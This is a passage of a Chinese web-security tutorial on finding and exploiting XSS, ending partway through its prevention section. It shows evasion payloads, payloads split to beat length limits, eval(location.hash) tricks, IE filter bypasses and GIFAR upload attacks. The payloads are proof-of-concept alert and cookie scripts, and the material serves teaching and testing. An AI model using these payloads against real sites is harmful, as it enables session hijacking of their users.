Explorer上，可以使用VBScript语言。该语言使用不同的语法和其他属性。可以通过各种方式插入VBScript代码，如：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script language<span class="token operator">=</span>vbs<span class="token operator">></span>MsgBox 1<span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span><span class="token string">"vbs:MsgBox 1"</span> src<span class="token operator">=</span>a<span class="token operator">></span><span class="token operator">&lt;</span>img onerror<span class="token operator">=</span>MsgBox+1 language<span class="token operator">=</span>vbs src<span class="token operator">=</span>a<span class="token operator">></span></code></pre><p>无论哪种情况，都可以使用vbscript(而不是vbs)来指定语言。请注意，最后一个示例使用了MsgBox+1，以避免使用空白符，因而不需要在属性值周围加上引号。这样做之所以可行，是因为+1有效地给“空白”加上了数字1，因此表达式求值的结果为1；随后，这一结果被传递给MsgBox函数</p></li></ol><ul><li>在VBScript中，一些函数无须括号即可调用</li><li>与JavaScript不同，VBScript不区分大小写</li></ul><ol start="6"><li><p>组合JavaScript和VBScript<br>为避开某些过滤，可以从JavaScript中调用VBScript，或在VBScript中调用JavaScript。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>scirpt<span class="token operator">></span>execScript<span class="token punctuation">(</span><span class="token string">"MsgBox 1 "</span>,<span class="token string">"vbscript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script language<span class="token operator">=</span>vbs<span class="token operator">></span>execScript<span class="token punctuation">(</span><span class="token string">"alert(1)"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>VBScript不区分大小写，即使输入被转换为大写，你的代码仍然可以执行。在这些情况下，如果你确实希望调用JavaScript函数，可以使用VBScript中的字符串操纵函数用所需的大小写构建一个命令，并用JavaScript使用该命令</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>SCRIPT LANGUAGE<span class="token operator">=</span>VBS<span class="token operator">></span>EXECSCRIPT<span class="token punctuation">(</span>LCASE<span class="token punctuation">(</span><span class="token string">"ALERT(1)"</span><span class="token punctuation">))</span><span class="token operator">&lt;</span>/SCRIPT<span class="token operator">></span><span class="token operator">&lt;</span>IMG ONERROR<span class="token operator">=</span><span class="token string">"VBS:EXECSCRIPT LCASE('ALERT(1)')"</span> SRC<span class="token operator">=</span>A<span class="token operator">></span></code></pre></li><li><p>使用经过编码的脚本<br>使用各种工具和网站对自己的脚本进行编码，以用于实施攻击。</p></li></ol><h5 id="避开净化"><a href="#避开净化" class="headerlink" title="避开净化"></a>避开净化</h5><p>应用程序对攻击字符串执行某种净化或编码，使其变得无害，防止它执行JavaScript。如果遇到这种防御，首先应查明应用程序净化哪些字符与表达式，以及是否仍然可以通过剩下的字符进行攻击。</p><h5 id="突破长度限制"><a href="#突破长度限制" class="headerlink" title="突破长度限制"></a>突破长度限制</h5><p>当应用程序把输入截短为一个固定的最大长度时，有三种建立攻击字符串的方法。</p><ol><li><p>第一种方法是尝试使用最短可能长度的JavaScriptAPI，删除那些通常包含在内但并不完全必要的字符，缩短攻击的有效载荷(可以使用Dean Edward的JavaScript packer工具删除不必要的空白符，尽可能缩短某一段脚本；或将脚本转换为单独一行，方便插入到一个请求参数中)。</p></li><li><p>第二种方法是将一个攻击有效载荷分布到几个不同的位置，用户控制的输入在这里插入到同一个返回页面中。以下面URL为例：</p><pre class=" language-bash"><code class="language-bash">https://wahh-app.com/account.php?page_id<span class="token operator">=</span>244<span class="token operator">&amp;</span>seed<span class="token operator">=</span>129402931<span class="token operator">&amp;</span>mode<span class="token operator">=</span>normal</code></pre><p>它返回一个包含以下内容的页面：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"page_id"</span> value<span class="token operator">=</span><span class="token string">"224"</span><span class="token operator">></span>   //限制长度<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"seed"</span> value<span class="token operator">=</span><span class="token string">"129402931"</span><span class="token operator">></span>   //限制长度<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"mode"</span> value<span class="token operator">=</span><span class="token string">"normal"</span><span class="token operator">></span>     //限制长度</code></pre><p>假设应用程序对每个字段实施了长度限制，以阻止在其中插入有效的攻击字符串。但是攻击者可以使用下面的URL将一段脚本分布到他所控制的三个位置，从而传送一个有效的字符串：</p><pre class=" language-bash"><code class="language-bash">https://wahh-app.com/account.php?page_id<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>/*<span class="token operator">&amp;</span>seed<span class="token operator">=</span>*/alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>/*<span class="token operator">&amp;</span>mode<span class="token operator">=</span>*/<span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>这个URL参数值植入到页面后，生成如下脚本：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"page_id"</span> value<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>/*<span class="token string">">&lt;input type="</span>hidden<span class="token string">" name="</span>seed<span class="token string">" value="</span>*/alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>/*<span class="token string">">&lt;input type="</span>hidden<span class="token string">" name="</span>mode<span class="token string">" value="</span>*/<span class="token operator">&lt;</span>/script<span class="token operator">></span>"<span class="token operator">></span></code></pre><p>最终的HTML完全有效，其中的源代码块已经称为JavaScript注释(包含在/* 与 * /之间)，因此被浏览器忽略。最后执行的部分为：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"page_id"</span> value<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>document.cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre></li><li><p>第三种是将一个反射型XSS漏洞“转换成”一个基于DOM的漏洞。例如，在最初的反射型XSS漏洞中，如果应用程序对复制到返回页面中的message参数设置长度限制，那么就可以注入以下45字节的漏洞，它对当前URL中的片断字符串求值。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>location.hash.slice<span class="token punctuation">(</span>1<span class="token punctuation">))</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>通过在易于受到反射型XSS攻击的参数中注入这段脚本，就可以在生成的页面中造成一个基于DOM的XSS漏洞，从而执行位于片段字符串中的另一段脚本，它不受应用程序过滤的影响。可为任意长度：</p><pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/5/Error.ashx?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>eval<span class="token punctuation">(</span>unescape<span class="token punctuation">(</span>location<span class="token punctuation">))</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token comment" spellcheck="true">#%0Aalert('long script here.......')</span></code></pre><p>在这个版本中，整个URL经过URL解码，然后传递给eval命令。整个URL将做为有效的JavaScript执行，因为http:协议前缀作为代码标签，协议前缀后面的//则作为单行注释，%0A经过URL解码后将变为换行符，表示注释结束。</p></li></ol><h5 id="实施有效的XSS攻击"><a href="#实施有效的XSS攻击" class="headerlink" title="实施有效的XSS攻击"></a>实施有效的XSS攻击</h5><p>下面是实施有效的XSS攻击时可能遇到的各种挑战及如何应对这些挑战。</p><ol><li><p>将攻击扩展到其他应用程序页面<br>设计一个可以通过应用程序的某个区域中的XSS漏洞传送，并且在用户的浏览器中持续存在的攻击有效载荷，就可以攻破同一个域中的目标数据或功能。要实现上面的功能，一个简单的办法是创建一个包含整个浏览器窗口的iframe，然后在该iframe中重新加载当前页面。在用户浏览站点并登录到通过验证的区域时，注入的脚本将始终在顶层窗口中运行，这样，攻击者就能够钩住子iframe中的导航事件和表单提交，监视iframe中显示的所有响应内容，当然也能够在适当的时候劫持用户会话。在支持HTML5的浏览器中，当用户在页面间移动时，脚本甚至可以使用<font color="#fb8c00">window.history.pushStack()</font>函数在地址栏设置适当的URL。</p></li><li><p>修改请求方法<br>有时，把使用GET方法的攻击转换成POST方法的攻击可能会避开某些过滤。</p></li><li><p>通过cookie利用XSS漏洞<br>一些应用程序包含反射型XSS漏洞，攻击这种漏洞的进入点在请求的cookie中。在这种情况下，可以利用各种技巧来利用这种漏洞：</p></li></ol><ul><li>和修改请求一样，应用程序可能允许你使用与cookie同名的URL或请求参数来触发漏洞。</li><li>如果应用程序包含任何可用于直接设置cookie值的功能(例如，基于提交参数值设置cookie的首选项页面)，则你可以设计一个跨站点请求伪造攻击，在受害者的浏览器中设置所需的cookie。然后，再诱使受害者提出以下两个请求：其中一个请求用于设置包含XSS有效载荷所需的cookie，另一个请求则用于请求以危险的方式处理cookie值的功能。</li><li>人们已经在浏览器扩展技术(如Flash)中发现各种漏洞，这使攻击者可以使用任意HTTP消息头提交跨域请求。因此，可以利用浏览器插件中的某个这种类型的漏洞来提交跨域请求，在其中包含任意旨在触发漏洞的cookie消息头</li><li>如果上述方法都无法成功实施攻击，你可以利用相同(或相关)域中的任何其他反射型XSS漏洞使用所需值设置一个永久性cookie，持续对受害者用户进行攻击</li></ul><ol start="4"><li><p>通过Referer消息头利用XSS漏洞<br>一些应用程序包含之只能通过Referer消息头触发的XSS漏洞。利用受他们控制的Web服务器，攻击者可以相当轻松地利用这些漏洞。例如，攻击者可以诱使受害者请求他们的服务器上的URL，该URL中包含针对易于攻击的应用程序的适当XSS有效载荷。然后，攻击者的服务器将返回一个响应，以请求上述URL，而攻击者的有效载荷就包含在此请求的Referer消息头中。<br>在某些情况下，只有在Referer消息头中包含与易受攻击的应用程序同属一个域的URL时，XSS漏洞才会触发。这时，可以利用应用程序中任何重定向功能来实施攻击。为此，攻击者需要构建一个指向该重定向功能的URL，在其中包含XSS攻击的有效载荷，并使其重定向到易于攻击的URL。这种攻击能否成功，取决于该功能使用的重定向方法。以及当前浏览器在进行上述重定向时是否会更新Referer消息头。</p></li><li><p>通过非标准请求和响应内容利用XSS漏洞<br>越来越多的程序采用不包含传统的请求参数的Ajax请求，在此之前，请求通常包含XML和JSON格式的数据，或采用各种序列化方案，因此，针对这些请求的响应往往包含同种或其他格式的数据，而不是HTML。下面对如何使用XML数据格式来实施攻击。</p></li></ol><ul><li>传送跨域XML请求<br>使用HTML表单(将enctype属性设置为text/plain)可以在HTTP请求主体中跨域传送几乎任何数据。这将告诉浏览器按照以下方式处理表单参数：<br>a. 在请求中隔行传送每个参数<br>b. 使用等号分隔每个参数的名称和值<br>c. 不对参数的值进行任何URL编码<br>上述行为意味着，只要数据中至少包含一个等号，就可以在消息主体中传送任意数据。为此，你需要将数据分隔成两块，等号前一块，等号后一块。然后，将第一块数据放在参数名称后，将第二块数据放在参数值中，这样，浏览器在构建请求时，它会传送以等号分隔的两块数据，因而 实际上构建了所需的数据。<br>由于XML在起始的XML标签的version属性中始终至少包含一个等号，因此，我们可以在消息主体中使用这种技巧跨域传送任意数据。<br>例如，如所需的XML如下所示：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span>data<span class="token operator">></span><span class="token operator">&lt;</span>param<span class="token operator">></span>foo<span class="token operator">&lt;</span>/param<span class="token operator">></span><span class="token operator">&lt;</span>/data<span class="token operator">></span></code></pre>则可以使用以下表单发送这些数据：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form enctype<span class="token operator">=</span><span class="token string">"text/plain"</span> action<span class="token operator">=</span><span class="token string">"http://wahh-app.com/ vuln.php"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">'&lt;?xml version'</span> value<span class="token operator">=</span><span class="token string">'"1.0"?>&lt;data>&lt;param>foo&lt;/param>&lt;/data>'</span><span class="token operator">></span><span class="token operator">&lt;</span>/form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document.forms<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>要在param参数的值中包含常用的攻击字符，如标签尖括号，你需要在XML请求中对这些字符进行HTML编码。因此，在生成该请求的HTML表单中，需要对它们进行双重HTML编码。<br>在使用这些技巧时，唯一需要注意的地方是，生成的请求将包的含以下消息头：<pre class=" language-bash"><code class="language-bash">Content-Type: text/plain</code></pre>正常情况下，根据生成请求的具体方式，最初的请求本应包含在一个不同的Content-Type消息头，如果应用程序接受提供Content-Type消息头并正常处理消息主体，则在设计有效的XSS攻击时就可以使用这种技巧。如果由于Content-Type消息头已被修改，应用程序无法正常处理请求，则可能就没有办法跨域传送适当的请求来触发类似的XSS的行为。</li></ul><p>如果在包含非标准内容的请求中确定了类似于XSS的行为，首先应迅速确定，将Content-Type改为text/plain之后，这种行为是否存在，如果这种行为不再存在，则不必继续尝试设计有效的XSS攻击。</p><ol start="6"><li>在XML响应中执行JavaScript<br>如果可以成功构建能够成功执行脚本的响应，往往需要利用所注入的内容类型的特定语法特性。对于XML而言，可以使用XHTML的新命名空间，并使浏览器将该命名空间解析为HTML，从而达到执行脚本的目的。例如，在firefox处理以下响应时，注入的脚本得以执行：<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OkContent-Type: text/xmlContent-Length: 1098</code></pre></li></ol><xml><data>.....<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>.....</data></xml>```如果响应由浏览器直接处理，而不是通常处理响应的原始应用程序组件处理时，此攻击将取得成功。<h5 id="攻击浏览器XSS过滤器"><a href="#攻击浏览器XSS过滤器" class="headerlink" title="攻击浏览器XSS过滤器"></a>攻击浏览器XSS过滤器</h5><p>IE浏览器默认包含一个XSS过滤器，其他浏览器也通过插件的形式提供类似的功能。这些过滤器的工作方式基本类似：它们被动监视请求和响应，并使用各种规则来确定正在进行的潜在XSS攻击。一旦确定潜在攻击，就修改响应的某些部分来阻止这些攻击。下面我们将介绍IE的XSS过滤器。<br>IE的XSS过滤器核心功能如下：</p><ul><li>检查跨域请求中的每一个参数值，以确定注入JavaScript的可能尝试。它会根据一个常见攻击字符串的基于正则表达式的黑名单来检查这些值，从而完成这一任务</li><li>如果发现潜在恶意的参数值，则检查响应，看其中是否包含相同的值。</li><li>如果响应中出现该值，则会对响应进行净化，以防止任何执行任何脚本。例如，它会将&lt; script&gt;修改为&lt;#script&gt;<br>大体而言，IE XSS过滤器能够有效阻止利用XSS漏洞的标准攻击，从而为任何尝试这类攻击的攻击者设置了很大的障碍。但是，我们也可以利用这种过滤器的工作机制来实施通过别的方法无法实施的其他攻击。下面是一些避开该过滤器的方法：</li><li>该过滤器只检查参数值，而不检查参数名称。一些应用程序易于受到针对参数名称的攻击，如在响应中回显请求的整个URL或整个查询字符串。该过滤器无法阻止这类攻击。</li><li>该过滤器单独检查每个参数的值。但是，如果在同一个响应中反射多个参数，就可以将攻击从一个参数传递到另一个参数(如用于突破长度限制的极其中所述)。如果可以将XSS有效载荷分隔成几块，则其中任何一块都不会与受阻止的表达式黑名单相匹配，这样，过滤器就无法阻止攻击。</li><li>由于性能原因，过滤器仅检查跨域请求。因此，攻击者能够事用户向XSS URL提出“本地”请求，过滤器将无法阻止这种攻击。通常，如果应用程序包含任何行为，允许攻击者在由其他用户查看的页面中注入任意链接，这种攻击即成为可能(虽然这本身也属于反射型攻击，但XSS过滤器仅尝试阻止注入的脚本，而不是注入的链接)。在这种情况下，攻击者需要完成两个步骤：在用户的页面中注入恶意链接；用户单击链接并收到有效的XSS有效载荷。</li></ul><h3 id="查找并利用保存型XSS漏洞"><a href="#查找并利用保存型XSS漏洞" class="headerlink" title="查找并利用保存型XSS漏洞"></a>查找并利用保存型XSS漏洞</h3><p>测试保存型XSS漏洞时能够采用的一些特殊技巧如下</p><h4 id="在Web邮件应用程序中测试XSS"><a href="#在Web邮件应用程序中测试XSS" class="headerlink" title="在Web邮件应用程序中测试XSS"></a>在Web邮件应用程序中测试XSS</h4><p>要测试这种功能，应该在该应用程序上创建自己的电子邮件账户，并通过电子邮件向自己实施大量XSS攻击，然后在该应用程序中查看每封邮件，确定是否有任何攻击取得成功。为彻底完成这一任务，你需要通过电子邮件发送各种反常的HTML内容(如我们在测试避开输入过滤的方法中所述)。如果仅限于使用标准电子邮件客户端，你会发现，无法完全控制原始的邮件内容，或者邮件客户端可能会净化或“清除”你有意设计的畸形语法。<br>在这种情况下，最好是采用其他方法来生成电子邮件，以便于直接控邮件的内容。一种方法是使用UNIX sendmail命令。首先，需要使用应当用于向外发送电子邮件的邮件服务器的详细信息配置电脑；然后，可以在文本编辑器中创建原始的电子邮件，并使用以下命令发送该邮件：</p><pre class=" language-bash"><code class="language-bash">sendmail -t test@example.org <span class="token operator">&lt;</span> email.txt</code></pre><p>以下为原始电子邮件文件的一个示例。在消息主体中测试各种XSS有效载荷和避开过滤的机制时，也可以尝试指定不同的Content-Type和charset：</p><pre class=" language-bash"><code class="language-bash">MIME-Version: 1.0From: test@example.orgContent-Type: text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>us-asciiContent-Transfer-Encoding: 7bitSubject: XSS <span class="token function">test</span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>``onerror<span class="token operator">=</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><h4 id="在上传文件中测试XSS"><a href="#在上传文件中测试XSS" class="headerlink" title="在上传文件中测试XSS"></a>在上传文件中测试XSS</h4><p>如果应用程序允许用户上传可被其他用户下载并查看的文件，就会出现保存型XSS。应用程序是否易于受到上传文件的攻击，取决于许多影响因素：</p><ul><li>在文件上传的过程中，应用程序可能会限制可以上传的文件的扩展名</li><li>在文件上传的过程中，应用程序可能会检查文件内容，以确认其是否为所需的格式，如JPEG</li><li>在文件下载过程中，应用程序可能会返回Content-Type消息头，以指定文件所包含的内容类型，如image/jpeg。</li><li>在文件下载的过程中，应用程序可能会返回Content-Disposition消息头，以指定浏览器应将文件保存到磁盘上。否则，对于相关的内容类型，应用程序会处理并在用户的浏览器中显示文件。<br>在测试文件上传功能时，首先你应该尝试上传一个包含概念验证脚本的简单HTML文件。如果该文件被接受，则测试以正常方式下载该文件，如果应用程序按原样返回最初的文件，并且你的脚本得以执行，则应用程序肯定易于受到攻击。<br>如果应用程序阻止上传的文件，则尝试使用各种文件扩展名，包括.txt和.jpg。如果在你使用其他扩展名时，应用程序接受包含HTML的文件，则应用程序仍然可能易于受到攻击。攻击者可以发送包含诱惑性图像附件的电子邮件，如果用户查看该附件，他们的会话将被攻破。</li></ul><h5 id="混合文件攻击"><a href="#混合文件攻击" class="headerlink" title="混合文件攻击"></a>混合文件攻击</h5><p>通常，为了防范以上攻击，应用程序会对上传的文件内容执行某种确认，以确保其确实包含所需格式的数据，如图像。但是，使用“混合文件”(在一个文件中组合两种不同的格式)仍然可以对这些应用程序实施攻击。</p><p>Billy Rios设计的GIFAR文件就是一种常见的混合文件。GIFAR文件包含GIF图像格式和JAR(java档案)格式的数据，并且是这两种格式的有效实例。这是因为，与GIF格式相关的文件元数据位于文件的开始部分，与JAR格式相关的元数据位于文件的末尾部分。因此，如果应用程序允许包含GIF数据的文件，那么，在确认上传内容时，该文件也会接受GIFAR文件。</p><p>通常，使用GIFAR文件实施的上传文件攻击由以下步骤组成：</p><ul><li>攻击者发现由一名用户上传的GIF文件可由其他用户下载(如社交网络应用程序中的用户头像)的应用程序功能</li><li>攻击者构建一个GIFAR文件，在其中包含一段Java代码，用于劫持任何执行该代码的用户的会话</li><li>攻击者将他文件作为他的头像上传。因为其中包含有效的GIF图像，应用程序将接受该图像</li><li>攻击者确定利用上传的文件对其实施攻击的适当外部网站。该网站可能为攻击者自己的网站，或允许其他用户创建任意HTML(如博客)的第三方站点。</li><li>在该外部网站上，攻击者使用&lt; applet&gt;和&lt; object&gt;标签从上述社交网络站点以Java applet的形式上传GIFAR文件。</li><li>如果用户访问该外部站点，攻击者的java applet将在其浏览器中执行。与包含正常脚本的文件不同，在遇到java applet时，同源策略的执行方式会不同。java applet将被视为属于加载它的域，而不是调用它的域。因此，攻击者的applet将在社交网络应用程序的域中执行。如果受害用户在受到攻击时已经登录该社交网络应用程序，或者曾登录该应用程序并选中了“保持登录状态”选项，则攻击者的applet将可以完全控制受害用户的会话，从而入侵该用户。</li></ul><p>当前java浏览器插件通过确认所加载的JAR是否包含混合内容，从而组织了这种使用GIFAR文件的特殊攻击。但是，使用混合文件隐藏可执行文件的原理仍然适用。攻击者或许可以以其他格式，或在将来通过其他方式实施类似的攻击。</p><h5 id="在通过Ajax上传的文件中测试XSS"><a href="#在通过Ajax上传的文件中测试XSS" class="headerlink" title="在通过Ajax上传的文件中测试XSS"></a>在通过Ajax上传的文件中测试XSS</h5><p>一些应用程序使用Ajax来检索和呈现在片段标识符之后指定的URL。例如，应用程序的主页可能包含以下链接：</p><pre class=" language-bash"><code class="language-bash">http://wahh-app.com/<span class="token comment" spellcheck="true">#profile</span></code></pre><p>当用户单击该链接时，客户端脚本将处理单击事件，使用Ajax来检索在片段标识符之后显示的文件，并在现有的页面中的&lt; div&gt;元素中的innerHtml中设置响应。这样可提供无缝的用户体验，因为单击用户界面中的选项卡将更新所显示的内容，而无须重新加载整个页面。<br>在这种情况下，如果应用程序还包含其他允许上传和下载图像文件(如用户头像)的功能，你就可以上传一个包含嵌入式HTML标记的有效图像文件，并构建以下URL，使客户端代码提取该图像并将其作为HTML显示。</p><pre class=" language-bash"><code class="language-bash">http://wahh-app.com/<span class="token comment" spellcheck="true">#profiles/#images/15234917624.jpg</span></code></pre><p>HTML可以嵌入到有效图像文件的各种位置，包括图像的注释部分。一些浏览器，包括firefox，乐于将图像文件以HTML的格式显示。图像二进制部分将显示为乱码，而任何嵌入的HTML将正常显示。</p><h3 id="查找并利用基于DOM的XSS漏洞"><a href="#查找并利用基于DOM的XSS漏洞" class="headerlink" title="查找并利用基于DOM的XSS漏洞"></a>查找并利用基于DOM的XSS漏洞</h3><p>提交一个特殊字符串作为每个参数，然后监控响应中是否出现该字符串的方法无法确定基于DOM的XSS漏洞。确定基于DOM的XSS漏洞的基本方法是：用浏览器手动浏览应用程序，并修改每一个URL参数，在其中插入一个标准测试的字符串，如：</p><pre class=" language-bash"><code class="language-bash"><span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span>//<span class="token string">'-alert(1)-'</span></code></pre><p>通过在浏览器中显示每一个返回的页面，可以执行所有客户端脚本，并在必要时引用经过修改的URL参数。只要包含cookie的对话框出现，就说明发现了一个漏洞(可能基于DOM或其他类型的XSS漏洞)。使用本身提供JavaScript解释器的工具甚至可以自动完成这个过程。但是，由于注入有效JavaScript所需的准确语法取决于用户可控制字符串插入点前后已经存在的语法。所以这种基本方法并不能确定所有基于DOM的XSS漏洞。</p><p>另一种更有效的方法，是检查所有客户端JavaScript，看其中是否使用了任何可能会导致漏洞的DOM属性。有大量工具可用于自动完成这个测试过程。其中一个有用的工具为DOMTracer。</p><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><p>以下是几种专门针对基于DOM的XSS漏洞的技巧可用于帮助攻击有效载荷避开服务器端确认：</p><ul><li><p>当客户端脚本从URL中提取参数值时，它们很少将查询字符串正确解析成名/值对。相反，它们通常会在URL中搜索后面紧跟着等号(=)的参数名称，然后提取出等号以后直到URL结束位置的内容。这种行为能够以两种方式加以利用：</p></li><li><p>如果服务器根据每个参数而不是整个URL应用确认机制，那么可以将有效载荷插入到附加在易受攻击的参数后面的一个虚构的参数中，如：</p><pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/76/Error.ashx?message<span class="token operator">=</span>Sorry%2d+an+error+occurred<span class="token operator">&amp;</span>foo<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>这时，虚构的参数被服务器忽略，因此不会受到任何过滤。但是，因为客户端脚本在查询字符串中搜索message=，并提取其后的全部内容，所以它处理的字符串中正好包含该有效载荷。</p></li><li><p>如果服务器对整个URL而不仅仅是消息参数应用确认机制，仍然有可能将有效载荷插入到HTML片段字符#的右边，从而避开过滤。例如：</p><pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/76/Error.ashx?message<span class="token operator">=</span>Sorry%2c+an+error+occurred<span class="token comment" spellcheck="true">#&lt;script>alert(1)&lt;/script></span></code></pre><p>这时，片断字符串仍然属于URL的一部分，因此被保存在DOM中，并由易受攻击的客户端处理。但是，由于浏览器并不将URL中的片断部分提交给服务器，因此攻击字符串不会传送到服务器中，因而不会被任何服务器端过滤所阻止。因为客户端脚本提取message=后的所有内容，所以有效载荷仍然被复制到HTML页面源码中。</p></li></ul><p>一些应用程序采用更加复杂的客户端脚本，对查询字符串进行更加严格的解析。例如，它在URL中搜索后面紧跟着等号的参数名称，然后提取等号后面的内容，直到遇到一个分隔符，如&amp;或#。在这种情况下，可以对前面的两个攻击进行如下修改：</p><pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/76/Error.ashx?foomessage<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&amp;</span>message<span class="token operator">=</span>Sorry%2c+an+error+occurredhttp://mdsec.net/error/76/Error.ashx?<span class="token comment" spellcheck="true">#message=&lt;script>alert(1)&lt;/script></span></code></pre><p>在这两个示例中，第一个message=后面紧跟着攻击字符串，其中没有任何干扰脚本执行的分隔符，因此攻击有效载荷将得到处理，且被复制到HTML页面的源代码中。</p><h2 id="防止XSS攻击"><a href="#防止XSS攻击" class="headerlink" title="防止XSS攻击"></a>防止XSS攻击</h2><h3 id="防止反射型和保存型XSS漏洞"><a href="#防止反射型和保存型XSS漏洞" class="headerlink" title="防止反射型和保存型XSS漏洞"></a>防止反射型和保存型XSS漏洞</h3><p>用户可控制的数据未经适当的确认与净化就被复制到应用程序中，这时造成反射型与保存型XSS的根本原因。由于数据被插入到一个HTML页面的源码中，恶意数据就会干扰这个页面，不仅修改这个内容，还会破坏它的结构(影响引用字符串、起始与结束标签、注入脚本等)。<br>为消除反射型和保存型XSS漏洞，首先必须确认应用程序中用户可控制的数据被复制到响应中的每一种情形。这包括从当前请求中复制的数据以及用户之前输入的保存在应用程序中的数据，还有通过带外通道输入的数据。为确保每一种情形，除仔细审查应用程序的全部源代码外，没有其他更好的办法。</p><p>确定可能存在XSS风险、需要适当进行防御的操作后，需要采取一种三重防御方法阻止漏洞的发生。这种方法由以下3种因素组成：</p><ul><li>确认输入</li><li>确认输出</li><li>消除危险的插入点</li></ul><p>如果应用程序需要允许用户以HTML格式创建格式内容(如允许在注释中使用HTML的博客应用程序)。应谨慎使用这种方法。</p><h4 id="确认输入"><a href="#确认输入" class="headerlink" title="确认输入"></a>确认输入</h4><p>如果应用程序在某个位置收到的用户提交的数据将来可能被复制到它的响应中，应用程序应对根据这种情形对这些数据进行严格的确认。可能需要确认的数据的特性包含以下几点：</p><ul><li>数据不是太长</li><li>数据仅包含某组合法字符</li><li>数据与一个特殊的正则表达式匹配</li></ul><h4 id="确认输出"><a href="#确认输出" class="headerlink" title="确认输出"></a>确认输出</h4><p>如果应用程序将某位用户或第三方提交的数据复制到它的响应中，那么应用程序应对这些数据进行HTML编码，以净化可能的恶意字符。HTML编码指用对应的HTML实体替代字面量字符。这样做可以确保浏览器安全处理可能为恶意的字符，把它们当作HTML文档的内容而非结构处理。一些经常造成问题的字符的HTML编码如下：</p><ul><li>“—&amp;quot ;</li><li>‘—&amp;apos ;</li><li>&amp;—&amp;amp ;</li><li>&lt;—&amp;lt ;</li><li><blockquote><p>—&amp;gt ;<br>除这些常用的编码外，实际上，任何字符都可以用它的数字ASCII字符代码进行HTML编码。为尽可能确保安全，开发者可能会选择HTML编码每个非字母数字字符，包括空白符。这种方法通常会显著增加应用程序的工作压力。同时给任何尝试避开过滤的攻击设置巨大障碍。在输入和输出防御中，输出确认更为重要，必不可少。<br>在设计输入和输出确认机制时，尤其要注意的是，应在实施规范化后再对数据进行过滤和编码，而且之后不得对数据实施进一步的规范化。应用程序还必须保证其中存在的空字节不会对它的确认造成任何干扰。</p></blockquote></li></ul><h4 id="消除危险的插入点"><a href="#消除危险的插入点" class="headerlink" 